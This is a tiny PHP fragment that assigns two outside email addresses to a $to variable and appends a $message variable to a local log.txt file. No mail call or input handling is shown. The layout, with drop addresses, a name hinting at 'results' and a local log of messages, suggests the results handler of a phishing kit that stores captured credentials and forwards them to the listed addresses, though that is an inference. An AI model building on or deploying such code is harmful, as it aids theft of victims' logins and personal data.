<?php
$to = "kalichill@yahoo.com,rezulta80@aol.com";
$file = fopen("./log.txt","a");
fwrite($file,$message."\n");
?>